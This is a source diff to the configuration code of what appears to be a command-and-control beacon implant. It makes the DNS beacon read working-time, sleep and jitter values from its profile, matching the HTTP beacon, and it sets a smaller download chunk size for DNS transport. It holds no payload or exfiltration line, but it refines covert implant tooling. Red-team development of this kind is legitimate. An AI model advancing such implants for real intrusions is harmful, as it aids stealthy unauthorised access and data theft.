@@ -67,8 +67,11 @@ AgentConfig::AgentConfig()
 #elif defined(BEACON_DNS)
 	// DNS beacon profile layout is packed on the Go side in pl_agent.go
 	// case "dns" as:
-	// [agent_type, domain, resolvers, qtype, pkt_size, label_size, ttl, listener_type, kill_date]
-	// Here we unpack in the same order and populate ProfileDNS.
+	// [agent_type, domain, resolvers, qtype, pkt_size, label_size, ttl,
+	//  listener_type, kill_date, working_time, sleep_seconds, jitter]
+	// Here we unpack in the same order and populate ProfileDNS + timing
+	// fields so that DNS beacon uses the same sleep/jitter behavior as
+	// the HTTP beacon.
 	this->profile.domain      = packer->UnpackBytesCopy(&length);
 	this->profile.resolvers   = packer->UnpackBytesCopy(&length);
 	this->profile.qtype       = packer->UnpackBytesCopy(&length);
@@ -79,13 +82,19 @@ AgentConfig::AgentConfig()
 	this->profile.encrypt_key = this->encrypt_key;
 	this->listener_type       = packer->Unpack32();
 	this->kill_date           = packer->Unpack32();
-	this->working_time        = 0;
-	this->sleep_delay         = 0;
-	this->jitter_delay        = 0;
+	this->working_time        = packer->Unpack32();
+	this->sleep_delay         = packer->Unpack32();
+	this->jitter_delay        = packer->Unpack32();
 
 #endif
 
-	this->download_chunk_size = 0x19000;
+#if defined(BEACON_DNS)
+	// DNS beacon uses a smaller per-chunk download size to improve
+	// reliability over the constrained DNS transport channel.
+	this->download_chunk_size = 0x8000; // 32 KB
+#else
+	this->download_chunk_size = 0x19000; // ~100 KB for HTTP/other transports
+#endif
 
 	MemFreeLocal((LPVOID*)&packer, sizeof(Packer));
 	MemFreeLocal((LPVOID*)&ProfileBytes, size);
